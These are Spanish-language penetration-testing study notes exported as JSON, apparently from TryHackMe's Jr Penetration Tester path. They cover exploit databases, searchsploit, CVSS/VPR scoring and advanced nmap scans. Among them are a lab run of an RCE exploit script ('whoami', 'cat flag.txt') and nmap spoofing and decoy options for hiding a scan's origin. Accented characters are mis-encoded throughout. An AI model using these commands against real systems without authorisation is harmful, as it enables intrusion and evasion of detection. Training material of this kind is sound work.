    "content": "<h2>Rapid7</h2>\nComo cualquier otro servicio como Exploit-DB y NVD, Rapid7 es una base de datos de b√∫squeda de vulnerabilidades. La √∫nica diferencia es que tambi√©n act√∫a como una base de datos de exploits. Usando este servicio puedes filtrar por tipo de vulnerabilidad (aplicaci√≥n, sistema operativo, etc.).\n\n![[Pasted image 20251122154218.png]]\n\nAdem√°s, la base de datos contiene instrucciones para explotar aplicaciones usando la herramienta metasploit. Por ejemplo, la imagen de abajo son las instrucciones de c√≥mo usar una vulnerabilidad en WordPress.\n\n![[Pasted image 20251122154458.png]]\n\n--------------------------------------\n<h2>GitHub</h2>\nGithub es un servicio web muy popular dise√±ado para desarrolladores de software. El sitio se usa para albergar y compartir c√≥digo fuente de aplicaciones para permitir la colaboraci√≥n. Los investigadores de ciberseguridad guardan y comparten PoCs en Github, convirti√©ndolo en una base de datos de exploits.\n\nEs extremadamente √∫til para encontrar exploits raros o nuevos porque cualquiera puede crear una cuenta y subir lo que sea.\n\n![[Pasted image 20251122164636.png]]\n\nGithub usa un sistema de etiquetado y palabras clave lo que hace la b√∫squeda m√°s sencilla.\n\n----------------------------\n<h2>Searchsploit</h2>\nEs una herramienta disponible pare varias distribuciones de Linux, como Kali Linux. Es una copia offline de Exploit -DB.\n\nPuedes buscar por aplicaci√≥n o por tipo de vulnerabilidad. En el ejemplo de abajo estamos buscando exploits relacionados a WordPress que podemos usar.\n\n```python\nsearchsploit wordpress\nWordPress Theme Think Responsive 1.0 - Arbitr | php/webapps/29332.txt\nWordPress Theme This Way - 'upload_settings_i | php/webapps/38820.php\nWordPress Theme Toolbox - 'mls' SQL Injection | php/webapps/38077.txt\nWordPress Theme Trending 0.1 - 'cpage' Cross- | php/webapps/36195.txt\nWordPress Theme Uncode 1.3.1 - Arbitrary File | php/webapps/39895.php\nWordPress Theme Urban City - 'download.php' A | php/webapps/39296.txt\nWordPress Theme Web Minimalist 1.1 - 'index.p | php/webapps/36184.txt\nWordPress Theme White-Label Framework 2.0.6 - | php/webapps/38105.txt\nWordPress Theme Wp-ImageZoom - 'id' SQL Injec | php/webapps/38063.txt\nWordPress Theme Zoner Real Estate - 4.1.1 Per | php/webapps/47436.txt\n```",
    "modified": "2025-12-12T13:58:55"
  },
  {
    "title": "1. Automated Vs. Manual Vulnerability Research",
    "path": "/apuntes/thm/1-career/2-penetration-tester/1-jr-penetration-tester/6-vulnerability-research/2-exploit-vulnerabilities/1-automated-vs-manual-vulnerability-research/",
    "src": "content/Ciberseguridad/THM/1. Career/2. Penetration Tester/1. Jr Penetration Tester/6. Vulnerability Research/2. Exploit Vulnerabilities/1. Automated Vs. Manual Vulnerability Research.md",
    "breadcrumb": "THM > 1. Career > 2. Penetration Tester > 1. Jr Penetration Tester > 6. Vulnerability Research > 2. Exploit Vulnerabilities",
    "content": "Hay muchos servicios y herramientas disponibles para escanear vulnerabilidades. Desde comerciales a c√≥digo abierto, se han convertido en la principal forma de buscar vulnerabilidades en un sistema. Por ejemplo el esc√°ner [Nesus](https://www.tenable.com/products/nessus) tiene los dos, uno de comunidad gratuito y otro de pago.\n\nAqu√≠ algunas ventajas y desventajas de usar un esc√°ner de vulnerabilidades.\n\n| Ventajas                                                                                   | Desventajas                                                                                                                |\n| ------------------------------------------------------------------------------------------ | -------------------------------------------------------------------------------------------------------------------------- |\n| F√°cilemente repetibles y con resultados compartibles.                                      | La gente se puede volver dependiente de estas.                                                                             |\n| Son r√°pidos y pueden comprobar varias aplicaciones a la vez.                               | Son extremadamente ruidosos y producen mucho tr√°fico y registros.                                                          |\n| Hay soluciones de c√≥digo abierto.                                                          | Las soluciones de c√≥digo abierto suelen ser b√°sicas y requerir altos costes para tener acceso a funcionalidades completas. |\n| Cubren un amplio rango de vulnerabilidades que pueden ser dif√≠ciles para buscarlas a mano. | Normalmente no encuentran todas las vulnerabilidades.                                                                      |\n\nFrameworks como Metasploit tienen esc√°ners de vulnerabilidades en algunos m√≥dulos. \n\nEl escaneo manual de vulnerabilidades es a menudo la elecci√≥n de muchos pentesters al comprobar una aplicaci√≥n o programa en espec√≠fico. \n\nLas vulnerabilidades que se buscan incluyen:\n\n| Vulnerabilidad             | Decripci√≥n                                                                                     |\n| -------------------------- | ---------------------------------------------------------------------------------------------- |\n| Security Misconfigurations | Las malas configuraciones incluyen vulnerabilidades debidas a que el desarrollador no las vi√≥. |\n| Broken Access Control      | Ocurre cuando un atacante es capaz de acceder a partes de la aplicaci√≥n que no deber√≠a poder.  |\n| Insecure Deserialization   | Procesamiento inseguro de informaci√≥n.                                                         |\n| Injection                  | Existe cuando un atacante es capaz de introducir informaci√≥n maliciosa en la aplicaci√≥n.       |",
    "modified": "2025-12-12T13:58:55"
  },
  {
    "title": "3. Example of Manual Exploit",
    "path": "/apuntes/thm/1-career/2-penetration-tester/1-jr-penetration-tester/6-vulnerability-research/2-exploit-vulnerabilities/3-example-of-manual-exploit/",
    "src": "content/Ciberseguridad/THM/1. Career/2. Penetration Tester/1. Jr Penetration Tester/6. Vulnerability Research/2. Exploit Vulnerabilities/3. Example of Manual Exploit.md",
    "breadcrumb": "THM > 1. Career > 2. Penetration Tester > 1. Jr Penetration Tester > 6. Vulnerability Research > 2. Exploit Vulnerabilities",
    "content": "Podemos usar la informaci√≥n extra√≠da de la tarea 1 de esta unidad para explotar un servicio vulnerable. Una de las vulnerabilidades m√°s cotizadas son aquellas que nos permiten la ejecuci√≥n remota de comandos.\n\nVamos a usar un exploit para realizar una RCE (Remote Command Execution) en la aplicaci√≥n de la unidad 1.\n\n>[!IMPORTANT] La mayor√≠a de exploits necesitan un poco de configuraci√≥n inicial para funcionar.\n\nPor ejemplo:\n\n1. Antes:\n   ```shell\n   nano exploit.py\n   mymachine=\"192.168.1.10\"\n   port=\"1337\"\n   ```\n\n2. Despu√©s:\n```shell\n   nano exploit.py\n   mymachine=\"10.13.37.10\"\n   port=\"1337\"\n   ```\n\nUna vez que hemos preparado el exploit, debemos ver c√≥mo utilizarlo:\n\n```shell\nexploit.py --help\nTo use this exploit, provide the following arguments:\n-u The URL of the application\n-c the command that you wish to execute\n```\n\nCon esta informaci√≥n podemos usarlo:\n\n1. Primero vamos a ejecutar un comando sencillo para asegurarnos de que funcione.\n   ```shell\n   exploit.py -u http://10.10.10.10 -c \"whoami\"\n   www-data\n   ```\n2. Luego vamos a leer un archivo que nos interese (una vez que sabemos que funciona).\n   ```shell\n   exploit.py -u http://10.10.10.10 -c \"cat flag.txt\"\n   THM{EXPLOIT_COMPLETE}\n   ```",
    "modified": "2025-12-12T13:58:55"
  },
  {
    "title": "0. Vulnerabilities 101",
    "path": "/apuntes/thm/1-career/2-penetration-tester/1-jr-penetration-tester/6-vulnerability-research/1-vulnerabilities-101/0-vulnerabilities-101/",
    "src": "content/Ciberseguridad/THM/1. Career/2. Penetration Tester/1. Jr Penetration Tester/6. Vulnerability Research/1. Vulnerabilities 101/0. Vulnerabilities 101.md",
    "breadcrumb": "THM > 1. Career > 2. Penetration Tester > 1. Jr Penetration Tester > 6. Vulnerability Research > 1. Vulnerabilities 101",
    "content": "[[1. Introduction to Vulnerabilities]]\n[[2. Scoring Vulnerabilities (CVSS & VPR)]]\n[[3. Vulnerability Databases]]\n[[4. And Example of Finding a Vulnerability]]",
    "modified": "2025-12-12T13:58:55"
  },
  {
    "title": "1. Introduction to Vulnerabilities",
    "path": "/apuntes/thm/1-career/2-penetration-tester/1-jr-penetration-tester/6-vulnerability-research/1-vulnerabilities-101/1-introduction-to-vulnerabilities/",
    "src": "content/Ciberseguridad/THM/1. Career/2. Penetration Tester/1. Jr Penetration Tester/6. Vulnerability Research/1. Vulnerabilities 101/1. Introduction to Vulnerabilities.md",
    "breadcrumb": "THM > 1. Career > 2. Penetration Tester > 1. Jr Penetration Tester > 6. Vulnerability Research > 1. Vulnerabilities 101",
    "content": "Una vulnerabilidad en ciberseguridad se define como una debilidad en el dise√±o, implementaci√≥n o comportamientos de un sistema o aplicaci√≥n. Una atacante puede explotar estas vulnerabilidades para ganar acceso a informaci√≥n no autorizada o realizar acciones no autorizadas. El t√©rmino vulnerabilidad tiene muchas definiciones. Sin embargo, las variaciones son m√≠nimas.\n\nEstas se pueden originar de varios factores, incluyendo un dise√±o pobre de la aplicaci√≥n o una omisi√≥n de las actividades previstas por un usuario.\n\nEstos son los principales tipos de vulnerabilidades:\n\n| Vulnerabilidad              | Descripci√≥n                                                                                                                      |\n| --------------------------- | -------------------------------------------------------------------------------------------------------------------------------- |\n| Operating System            | Estos tipos se encuentran en sistemas operativos y suelen resultar en escaladade privilegios.                                    |\n| (Mis)Configuration-based    | Estos tipos surgen de una aplicaci√≥n o servicio mal configurado.                                                                 |\n| Weak or Default Credentials | Las aplicaciones o servicios que tengan un elemento de autentificaci√≥n, vendr√°n con unas credenciales por defecto al instalarse. |\n| Application Logic           | Son el resultado de aplicaciones pobremente dise√±adas.                                                                           |\n| Human-Factor                | Estas son vulnerabilidades que surgen del comportamiento humano, como el phishing.                                               |",
    "modified": "2025-12-12T13:58:55"
  },
  {
    "title": "3. Vulnerability Databases",
    "path": "/apuntes/thm/1-career/2-penetration-tester/1-jr-penetration-tester/6-vulnerability-research/1-vulnerabilities-101/3-vulnerability-databases/",
    "src": "content/Ciberseguridad/THM/1. Career/2. Penetration Tester/1. Jr Penetration Tester/6. Vulnerability Research/1. Vulnerabilities 101/3. Vulnerability Databases.md",
    "breadcrumb": "THM > 1. Career > 2. Penetration Tester > 1. Jr Penetration Tester > 6. Vulnerability Research > 1. Vulnerabilities 101",
    "content": "Hay recursos en internet que llevan un conteo de las vulnerabilidades para todo tipo de software, sistemas operativos y m√°s. En esta tarea veremos dos bases de datos en las que podemos ver vulnerabilidades existentes.\n\n1. [NVD (National Vulnerability Database)](https://nvd.nist.gov/vuln)\n2. [Exploit-DB](http://exploit-db.com/)\n\nAntes de adentrarnos en estas dos vamos a asegurarnos de que entendemos algunos t√©rminos clave.\n\n| T√©rmino                | Definici√≥n                                                                                            |\n| ---------------------- | ----------------------------------------------------------------------------------------------------- |\n| Vulnerabilidad         | Debilidad o fallo en el dise√±o, implementaci√≥n o comportamientos de un sistema o aplicaci√≥n.          |\n| Exploit                | Acci√≥n o comportamiento que utiliza una vulnerabilidad.                                               |\n| Proof of Concept (PoC) | La prueba de concepto es una t√©cnica o herramienta que demuestra la explotaci√≥n de la vulnerabilidad. |\n\n--------------------------------------------\n<h2>NVD -National Vulnerability Database</h2>\nEs un sitio web que lista todas las vulnerabilidades p√∫blicas por categor√≠a. En ciberseguridad, las vulnerabilidades se clasifican bajo \"Common Vulnerabilities and Exploits (CVE)\".\n\nEstos CVEs tienen el formato: `CVE-A√ëO-N√öMERO_ID`. Por ejemplo, la vulnerabilidad que el famoso malware us√≥ fue `CVE-2017-0144`.\n\nNVD nos permite ver todos los CVEs que han sido confirmados, usando filtros por categor√≠a y mes de subida.\n\n![[Pasted image 20251122141802.png]]\n\nAunque esta web lleva la cuenta de todas las vulnerabilidades nuevas, no es muy buena para buscar por escenarios o aplicaciones espec√≠ficas.\n\n----------------------------------\n<h2>Exploit-DB</h2>\nExploit-DB es un recurso que encontraremos mucho m√°s de ayuda durante nuestros pentests. Retiene exploits para software y aplicaciones bajo el nombre, autor y versi√≥n del software o la aplicaci√≥n.\n\nPodemos usar Exploit-DB para buscar trazas de c√≥digo (PoC) que se usan para explotar una vulnerabilidad en espec√≠fico.\n\n![[Pasted image 20251122142028.png]]",
    "modified": "2025-12-12T13:58:55"
  },
  {
    "title": "2. Scoring Vulnerabilities (CVSS & VPR)",
    "path": "/apuntes/thm/1-career/2-penetration-tester/1-jr-penetration-tester/6-vulnerability-research/1-vulnerabilities-101/2-scoring-vulnerabilities-cvss-vpr/",
    "src": "content/Ciberseguridad/THM/1. Career/2. Penetration Tester/1. Jr Penetration Tester/6. Vulnerability Research/1. Vulnerabilities 101/2. Scoring Vulnerabilities (CVSS & VPR).md",
    "breadcrumb": "THM > 1. Career > 2. Penetration Tester > 1. Jr Penetration Tester > 6. Vulnerability Research > 1. Vulnerabilities 101",
    "content": "El manejo de vulnerabilidades es el proceso de evaluar, categorizar y remediar amenazas. Es pr√°cticamente imposible parchear todas las vulnerabilidades de una red o sistema y a veces es una p√©rdida de tiempo.\n\nDespu√©s de todo, s√≥lo aproximadamente el 2% de las vulnerabilidades acaban siendo explotadas. En su lugar se trata de abordar las vulnerabilidades m√°s peligrosas y reducir la probabilidad de uso del vector de ataque.\n\nAqu√≠ es donde entran en juego los sistemas de calificaci√≥n de vulnerabilidades.\n\n-------------------------------\n<h2>Common Vulnerability Scoring System (CVSS)</h2>\nIntroducido por primera vez en 2005, es muy popular. Mide las siguientes preguntas para puntuar una vulnerabilidad:\n\n1. ¬øC√≥mo de f√°cil es explotarla?\n2. ¬øExisten exploits para esto?\n3. ¬øC√≥mo interfiere esta vulnerabilidad con la tr√≠ada CIA?\n\nDe hecho hay tantas variables que debes usar una [calculadora](https://nvd.nist.gov/vuln-metrics/cvss/v3-calculator) para calcular la nota usando este framework. La vulnerabilidad recibe una clasificaci√≥n en funci√≥n de la nota obtenida. Estas siguen la siguiente tabla:\n\n| **Rating** | **Score**  |\n| ---------- | ---------- |\n| None       | 0          |\n| Low        | 0.1 - 3.9  |\n| Medium     | 4.0 - 6.9  |\n| High       | 7.0 - 8.9  |\n| Critical   | 9.0 - 10.0 |\n\nSin embargo, CVSS no es una bala m√°gica. Si analizamos algunas de las ventajas y desventajas del sistema CVSS:\n\n| Ventajas de CVSS                                                        | Desventajas de CVSS                                                                                                                         |\n| ----------------------------------------------------------------------- | ------------------------------------------------------------------------------------------------------------------------------------------- |\n| CVSS lleva muchos a√±os.                                                 | CVSS no est√° dise√±ado para dar prioridad a las vulnerabilidades sino para establecer un nivel de severidad.                                 |\n| CVSS es popular en organizaciones.                                      | CVSS eval√∫a las vulnerabilidades en funci√≥n de la disponibilidad de un exploit. Sin embargo s√≥lo el 20% lo tienen.                          |\n| CVSS es un framework gratuito y recomendado por asociaciones como NIST. | Las vulnerabilidades no cambian de nota casi nunca despu√©s de su evaluaci√≥n, incluso cuando nuevos desarrollos permiten encontrar exploits. |\n\n\n--------------------------------------\n<h2>Vulnerability Priority Rating (VPR)</h2>\nEl framework VPR es mucho m√°s moderno en cuanto al manejo de vulnerabilidades. Desarrollado por Tenable. Est√° considerado por ser basado en riesgos asociados, lo que significa que a las vulnerabilidades se les da una nota con un enfoque en el riesgo que la vulnerabilidad supone para una organizaci√≥n.\n\nAl contrario que CVSS, la puntuaci√≥n de VPR toma en cuenta la relevancia. Es decir, no ser√° considerado ning√∫n riesgo una vulnerabilidad la cual no se aplique a la organizaci√≥n. Adem√°s es din√°mico de manera que la nota puede variar con el tiempo.\n\n| **Rating** | **Score**  |\n| ---------- | ---------- |\n| Low        | 0.0 - 3.9  |\n| Medium     | 4.0 - 6.9  |\n| High       | 7.0 - 8.9  |\n| Critical   | 9.0 - 10.0 |\n\nVeamos algunas de las ventajas y desventajas de usar VPR.\n\n| **Advantages of VPR**                                                                                            | **Disadvantages of VPR**                                         |\n| ---------------------------------------------------------------------------------------------------------------- | ---------------------------------------------------------------- |\n| VPR es moderno y orientado al mundo real.                                                                        | VPR no es de c√≥digo abierto.                                     |\n| VPR considera m√°s de 150 factores para calcular el riesgo.                                                       | VPR s√≥lo puede adoptarse como parte de una plataforma comercial. |\n| VPR est√° basado en riesgos y es usado por organizaciones para ayudar a priorizar el parcheo de vulnerabilidades. | VPR no considera la tr√≠ada CIA igual que CVSS.                   |\n| Los resultados no son finales y pueden variar en el tiempo.                                                      | En blanco intencionalmente.                                      |",
    "modified": "2025-12-12T13:58:55"
  },
  {
    "title": "4. And Example of Finding a Vulnerability",
    "path": "/apuntes/thm/1-career/2-penetration-tester/1-jr-penetration-tester/6-vulnerability-research/1-vulnerabilities-101/4-and-example-of-finding-a-vulnerability/",
    "src": "content/Ciberseguridad/THM/1. Career/2. Penetration Tester/1. Jr Penetration Tester/6. Vulnerability Research/1. Vulnerabilities 101/4. And Example of Finding a Vulnerability.md",
    "breadcrumb": "THM > 1. Career > 2. Penetration Tester > 1. Jr Penetration Tester > 6. Vulnerability Research > 1. Vulnerabilities 101",
    "content": "Vamos a ver c√≥mo es el proceso de encontrar una vulnerabilidad menor, junto con algo de investigaci√≥n sobre las bases de datos de vulnerabilidades que llevan a una vulnerabilidad mucho mayor y finalmente exploit.\n\nNormalmente combinar√°s m√∫ltiples vulnerabilidades para obtener resultados. Por ejemplo, en esta tarea usaremos la vulnerabilidad de \"Version Disclosure\" para exponer la versi√≥n de la aplicaci√≥n, lo que nos permitir√° encontrar una vulnerabilidad m√°s grave.\n\nPor ejemplo, en la foto de abajo podemos ver que se est√° usando la versi√≥n **9.0.17** de **Apache Tomcat**.\n\n![[Pasted image 20251122144147.png]]\n\nCon esta informaci√≥n en la mano, vamos a Exploit-DB e introducimos los detalles:\n\n![[Pasted image 20251122144216.png]]",
    "modified": "2025-12-12T13:58:55"
  },
  {
    "title": "1. Redireccion",
    "path": "/apuntes/thm/1-career/2-penetration-tester/1-jr-penetration-tester/6-vulnerability-research/3-vulnerability-capstone/1-redireccion/",
    "src": "content/Ciberseguridad/THM/1. Career/2. Penetration Tester/1. Jr Penetration Tester/6. Vulnerability Research/3. Vulnerability Capstone/1. Redireccion.md",
    "breadcrumb": "THM > 1. Career > 2. Penetration Tester > 1. Jr Penetration Tester > 6. Vulnerability Research > 3. Vulnerability Capstone",
    "content": "Para ver este curso ve a **THM -> Maquinas -> 1. Easy -> 1. Vulnerability Capstone**",
    "modified": "2025-12-12T13:58:55"
  },
  {
    "title": "0. Vulnerability Capstone",
    "path": "/apuntes/thm/1-career/2-penetration-tester/1-jr-penetration-tester/6-vulnerability-research/3-vulnerability-capstone/0-vulnerability-capstone/",
    "src": "content/Ciberseguridad/THM/1. Career/2. Penetration Tester/1. Jr Penetration Tester/6. Vulnerability Research/3. Vulnerability Capstone/0. Vulnerability Capstone.md",
    "breadcrumb": "THM > 1. Career > 2. Penetration Tester > 1. Jr Penetration Tester > 6. Vulnerability Research > 3. Vulnerability Capstone",
    "content": "[[Ciberseguridad/THM/Maquinas/1. Easy/1. Vulnerability Capstone/0. Vulnerability Capstone]]\n[[Ciberseguridad/THM/1. Career/2. Penetration Tester/1. Jr Penetration Tester/6. Vulnerability Research/3. Vulnerability Capstone/1. Redireccion]]",
    "modified": "2025-12-12T13:58:55"
  },
  {
    "title": "1. Redireccion",
    "path": "/apuntes/thm/1-career/2-penetration-tester/1-jr-penetration-tester/7-metasploit/3-metasploit-meterpreter/1-redireccion/",
    "src": "content/Ciberseguridad/THM/1. Career/2. Penetration Tester/1. Jr Penetration Tester/7. Metasploit/3. Metasploit - Meterpreter/1. Redireccion.md",
    "breadcrumb": "THM > 1. Career > 2. Penetration Tester > 1. Jr Penetration Tester > 7. Metasploit > 3. Metasploit - Meterpreter",
    "content": "Para ver este curso ve a **THM -> 0. Pre Career -> 2. Cyber Security 101 -> 7. Exploitation Basics -> 4. Metasploit - Meterpreter**",
    "modified": "2025-12-12T13:58:55"
  },
  {
    "title": "0. Metasploit - Meterpreter",
    "path": "/apuntes/thm/1-career/2-penetration-tester/1-jr-penetration-tester/7-metasploit/3-metasploit-meterpreter/0-metasploit-meterpreter/",
    "src": "content/Ciberseguridad/THM/1. Career/2. Penetration Tester/1. Jr Penetration Tester/7. Metasploit/3. Metasploit - Meterpreter/0. Metasploit - Meterpreter.md",
    "breadcrumb": "THM > 1. Career > 2. Penetration Tester > 1. Jr Penetration Tester > 7. Metasploit > 3. Metasploit - Meterpreter",
    "content": "[[Ciberseguridad/THM/0. Pre Career/2. Cyber Security 101/7. Exploitation Basics/4. Metasploit - Meterpreter/0. Metasploit - Meterpreter]]\n[[Ciberseguridad/THM/1. Career/2. Penetration Tester/1. Jr Penetration Tester/7. Metasploit/3. Metasploit - Meterpreter/1. Redireccion]]",
    "modified": "2025-12-12T13:58:55"
  },
  {
    "title": "1. Redireccion",
    "path": "/apuntes/thm/1-career/2-penetration-tester/1-jr-penetration-tester/7-metasploit/1-metasploit-introduction/1-redireccion/",
    "src": "content/Ciberseguridad/THM/1. Career/2. Penetration Tester/1. Jr Penetration Tester/7. Metasploit/1. Metasploit - Introduction/1. Redireccion.md",
    "breadcrumb": "THM > 1. Career > 2. Penetration Tester > 1. Jr Penetration Tester > 7. Metasploit > 1. Metasploit - Introduction",
    "content": "Para ver este curso ve a **THM -> 0. Pre Career -> 2. Cyber Security 101 -> 7. Exploitation Basics -> 2. Metasploit - Introduction**",
    "modified": "2025-12-12T13:58:55"
  },
  {
    "title": "0. Metasploit - Introduction",
    "path": "/apuntes/thm/1-career/2-penetration-tester/1-jr-penetration-tester/7-metasploit/1-metasploit-introduction/0-metasploit-introduction/",
    "src": "content/Ciberseguridad/THM/1. Career/2. Penetration Tester/1. Jr Penetration Tester/7. Metasploit/1. Metasploit - Introduction/0. Metasploit - Introduction.md",
    "breadcrumb": "THM > 1. Career > 2. Penetration Tester > 1. Jr Penetration Tester > 7. Metasploit > 1. Metasploit - Introduction",
    "content": "[[Ciberseguridad/THM/0. Pre Career/2. Cyber Security 101/7. Exploitation Basics/2. Metasploit - Introduction/0. Metasploit - Introduction]]\n[[Ciberseguridad/THM/1. Career/2. Penetration Tester/1. Jr Penetration Tester/7. Metasploit/1. Metasploit - Introduction/1. Redireccion]]",
    "modified": "2025-12-12T13:58:55"
  },
  {
    "title": "0. Metasploit - Exploitation",
    "path": "/apuntes/thm/1-career/2-penetration-tester/1-jr-penetration-tester/7-metasploit/2-metasploit-exploitation/0-metasploit-exploitation/",
    "src": "content/Ciberseguridad/THM/1. Career/2. Penetration Tester/1. Jr Penetration Tester/7. Metasploit/2. Metasploit - Exploitation/0. Metasploit - Exploitation.md",
    "breadcrumb": "THM > 1. Career > 2. Penetration Tester > 1. Jr Penetration Tester > 7. Metasploit > 2. Metasploit - Exploitation",
    "content": "[[Ciberseguridad/THM/0. Pre Career/2. Cyber Security 101/7. Exploitation Basics/3. Metasploit - Exploitation/0. Metasploit - Exploitation]]\n[[Ciberseguridad/THM/1. Career/2. Penetration Tester/1. Jr Penetration Tester/7. Metasploit/2. Metasploit - Exploitation/1. Redireccion]]",
    "modified": "2025-12-12T13:58:55"
  },
  {
    "title": "1. Redireccion",
    "path": "/apuntes/thm/1-career/2-penetration-tester/1-jr-penetration-tester/7-metasploit/2-metasploit-exploitation/1-redireccion/",
    "src": "content/Ciberseguridad/THM/1. Career/2. Penetration Tester/1. Jr Penetration Tester/7. Metasploit/2. Metasploit - Exploitation/1. Redireccion.md",
    "breadcrumb": "THM > 1. Career > 2. Penetration Tester > 1. Jr Penetration Tester > 7. Metasploit > 2. Metasploit - Exploitation",
    "content": "Para ver este curso ve a **THM -> 0. Pre Career -> 2. Cyber Security 101 -> 7. Exploitation Basics -> 3. Metasploit - Exploitation**",
    "modified": "2025-12-12T13:58:55"
  },
  {
    "title": "4. TCP ACK, Window, and Custom Scan",
    "path": "/apuntes/thm/1-career/2-penetration-tester/1-jr-penetration-tester/5-network-security/5-nmap-advanced-port-scans/4-tcp-ack-window-and-custom-scan/",
    "src": "content/Ciberseguridad/THM/1. Career/2. Penetration Tester/1. Jr Penetration Tester/5. Network Security/5. Nmap Advanced Port Scans/4. TCP ACK, Window, and Custom Scan.md",
    "breadcrumb": "THM > 1. Career > 2. Penetration Tester > 1. Jr Penetration Tester > 5. Network Security > 5. Nmap Advanced Port Scans",
    "content": "En esta tarea veremos c√≥mo realizar un escaneo TCP ACK, uno TCP window y c√≥mo crear un escaneo con flags personalizadas.\n\n------------------------------------\n<h2>TCP ACK Scan</h2>\nComo su proopio nombre indica, mandar√° un paquete TCP con la flag ACK configurada. Usa la opci√≥n `-sA` para seleccionar este escaneo. El objetivo responde con RST independientemente del estado del puerto. Esto pasa porque s√≥lo deber√≠a mandarse un paquete ACK despu√©s de haber iniciado una conexi√≥n con TCP SYN.\n\n![[Pasted image 20251120130932.png]]\n\nEn el ejemplo de abajo, vemos la respuesta del servidor antes de instalar en √©l un FireWall.\n\n```shell\npentester@TryHackMe$ sudo nmap -sA 10.82.177.232\n\nStarting Nmap 7.60 ( https://nmap.org ) at 2021-08-30 10:37 BST\nNmap scan report for 10.82.177.232\nHost is up (0.0013s latency).\nAll 1000 scanned ports on 10.82.177.232 are unfiltered\nMAC Address: 02:45:BF:8A:2D:6B (Unknown)\n\nNmap done: 1 IP address (1 host up) scanned in 1.68 seconds\n```\n\nEste escaneo es m√°s √∫til para descubrir reglas de firewall ya que dependiendo de la respuesta que recibamos podemos corroborar si un Firewall est√° bloqueando el tr√°fico.\n\nDespu√©s d econfigurar un Firewall y repetir el escaneo:\n\n```shell\npentester@TryHackMe$ sudo nmap -sA 10.82.177.232\n\nStarting Nmap 7.60 ( https://nmap.org ) at 2021-09-07 11:34 BST\nNmap scan report for 10.82.177.232\nHost is up (0.00046s latency).\nNot shown: 997 filtered ports\nPORT    STATE      SERVICE\n22/tcp  unfiltered ssh\n25/tcp  unfiltered smtp\n80/tcp  unfiltered http\nMAC Address: 02:78:C0:D0:4E:E9 (Unknown)\n\nNmap done: 1 IP address (1 host up) scanned in 15.45 seconds\n```\n\n\n-------------------------------------\n<h2>Window Scan</h2>\nOtro escaneo similar es el escaneo TCP window. Este es casi lo mismo que el ACK, sin embargo, examina el campo TCP Window de los paquetes RST devueltos. En sistemas espec√≠ficos, esto puede revelar que el puerto est√° abierto. Para seleccionar este tipo de escaneo usamos la opci√≥n `-sW`.\n\n![[Pasted image 20251120131503.png]]\n\nLanzar un escaneo TCP window contra un sistema Linux sin firewall no har√° mucho. \n\n```shell\npentester@TryHackMe$ sudo nmap -sW 10.82.177.232\n\nStarting Nmap 7.60 ( https://nmap.org ) at 2021-08-30 10:38 BST\nNmap scan report for 10.82.177.232\nHost is up (0.0011s latency).\nAll 1000 scanned ports on ip-10-10-252-27.eu-west-1.compute.internal (10.10.252.27) are closed\nMAC Address: 02:45:BF:8A:2D:6B (Unknown)\n\nNmap done: 1 IP address (1 host up) scanned in 1.60 seconds\n```\n\nSin embargo, con un firewall:\n\n```shell\npentester@TryHackMe$ sudo nmap -sW 10.82.177.232\n\nStarting Nmap 7.60 ( https://nmap.org ) at 2021-09-07 11:39 BST\nNmap scan report for 10.82.177.232\nHost is up (0.00040s latency).\nNot shown: 997 filtered ports\nPORT    STATE  SERVICE\n22/tcp  closed ssh\n25/tcp  closed smtp\n80/tcp  closed http\nMAC Address: 02:78:C0:D0:4E:E9 (Unknown)\n\nNmap done: 1 IP address (1 host up) scanned in 14.84 seconds\n```\n\nAunque respondi√≥ con \"closed\" nosotros sabemos que no est√°n cerrados por lo que sabemos que respondieron diferente al escaneo TCP ACK. Por eso podemos determinar que no est√° bloqueados por el firewall.\n\n----------------------------------\n<h2>Custom Scan</h2>\nSi quieres experimentar con combinaciones nuevas de flags TCP, puedes hacerlo usando `--scanflags`. Por ejemplo, si quisieras mandar SYN, RST, y FIN lo har√≠as as√≠: `--scanflags SYNRSTFIN`. Si haces esto, debes saber c√≥mo se comportar√°n los puertos para analizar objetivos m√°s adelante:\n\n![[Pasted image 20251120131926.png]]\n\nAunque los escaneos TCP ACK y TCP Window nos sirvieron para mapear reglas del firewall, es importante tener en cuenta que que el firewall no bloquee un puerto no quiere decir que haya un servicio escuchando en dicho puerto.",
    "modified": "2025-12-12T13:58:55"
  },
  {
    "title": "5. Spoofing and Decoys",
    "path": "/apuntes/thm/1-career/2-penetration-tester/1-jr-penetration-tester/5-network-security/5-nmap-advanced-port-scans/5-spoofing-and-decoys/",
    "src": "content/Ciberseguridad/THM/1. Career/2. Penetration Tester/1. Jr Penetration Tester/5. Network Security/5. Nmap Advanced Port Scans/5. Spoofing and Decoys.md",
    "breadcrumb": "THM > 1. Career > 2. Penetration Tester > 1. Jr Penetration Tester > 5. Network Security > 5. Nmap Advanced Port Scans",
    "content": "En algunas configuraciones, ser√°s capaz de hacer un escaneo al sistema usando una direcci√≥n IP falsa /suplantada (spoofed). Dicho escaneo s√≥lo es beneficioso en una situaci√≥n donde puedas garantizar capturar la respuesta. Si lo haces con un sistema de una red cualquiera lo m√°s probable es que no obtengas respuesta alguna.\n\n![[Pasted image 20251120144031.png]]\n\nEn resumen, escanear con una direcci√≥n IP suplantada tiene tres pasos:\n\n1. El atacante manda un paquete con una direcci√≥n IP suplantada.\n2. La m√°quina objetivo responde a la IP suplantada.\n3. El atacante captura la respuesta para identificar los puertos abiertos.\n\nEn general, espera especificar la interfaz de red con `-e` y deshabilitar el escaneo de hosts con ping mediante `-Pn`. Por lo que en vez de `nmap -S SPOOFED_IP IP_OBJETIVO` necesitar√°s usar: `nmap -e INTERFAZ_DE_RED -Pn -S SPOOFED_IP IP_OBJETIVO`.\n\nCuando est√°s en la misma subred que tu objetivo, tambi√©n podr√°s suplantar la MAC usando `--spoof-mac SPOOFED_MAC`.\n\nEl spoofing s√≥lo funcionar√° en un n√∫mero m√≠nimo de casos donde se cumplan ciertas condiciones. Es por esto que los atacantes puedan preferir usar decoys (se√±uelos) para hacer m√°s complicado se√±alar la IP real del escaneo. El concepto es simple:\n\n![[Pasted image 20251120152742.png]]\n\nUsamos direcciones IP junto a la nuestra para generar ruido. El ejemplo `nmap -D 10.10.0.1,10.10.0.2,ME IP_OBJETIVO` har√° que el escaneo parezca venir de esas IPs. Tambi√©n podemos hacer que se asignen IPs aleatorias a los decoys con `nmap -D 10.10.0.2,10.10.0.2,RND,RND,ME IP_OBJETIVO`.",
    "modified": "2025-12-12T13:58:55"
  },
  {
    "title": "1. Introduction",
